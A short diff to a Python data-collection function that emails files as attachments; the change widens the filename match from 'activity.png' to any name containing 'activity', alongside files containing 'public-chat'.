@@ -35,7 +35,7 @@ def collect_data():
     msg.attach(part)
     # Add Attachment
     for filename in os.listdir():
-        if 'public-chat' in filename or filename == 'activity.png':
+        if 'public-chat' in filename or 'activity' in filename:
             with open(filename, "rb") as attachment:
                 part = MIMEBase("application", "octet-stream")
                 part.set_payload(attachment.read())
